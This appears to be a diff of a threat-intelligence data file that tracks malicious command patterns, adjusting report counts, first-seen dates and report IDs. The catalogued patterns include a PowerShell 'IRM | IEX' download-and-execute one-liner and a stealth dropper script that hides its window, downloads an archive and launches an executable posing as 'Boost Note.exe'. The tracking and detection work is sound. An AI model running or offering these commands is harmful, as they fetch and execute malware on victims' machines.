@@ -760,11 +760,10 @@
   {
     "Pattern": "IRM <URL> | IEX",
     "DistinctPayloadCount": 11,
-    "ReportCount": 60,
-    "FirstSeen": "2026-11-16T00:46:26.607000+00:00",
+    "ReportCount": 59,
+    "FirstSeen": "2026-11-16T03:23:07.763000+00:00",
     "LastSeen": "2026-11-22T05:17:52.705000+00:00",
     "ReportIds": [
-      "cmwijm8za0zxz0omlgbyn6tef",
       "cmwip7qyl10kv0oml5lmz6u6u",
       "cmwipmr8w10qm0omla41u3zjf",
       "cmwipnx5h10rt0omlraf3fb6q",
@@ -890,11 +889,10 @@
   {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 1,
-    "ReportCount": 33,
-    "FirstSeen": "2026-11-16T00:46:11.976000+00:00",
+    "ReportCount": 32,
+    "FirstSeen": "2026-11-16T03:11:24.720000+00:00",
     "LastSeen": "2026-11-20T17:27:10.495000+00:00",
     "ReportIds": [
-      "cmwijlxrh0zwy0omlmlk3hhqx",
       "cmwiosojj10g80omlecnzsl55",
       "cmwj33cj016tu0oml5m5v87wb",
       "cmwj36tyq16yb0omldf4pvs2n",
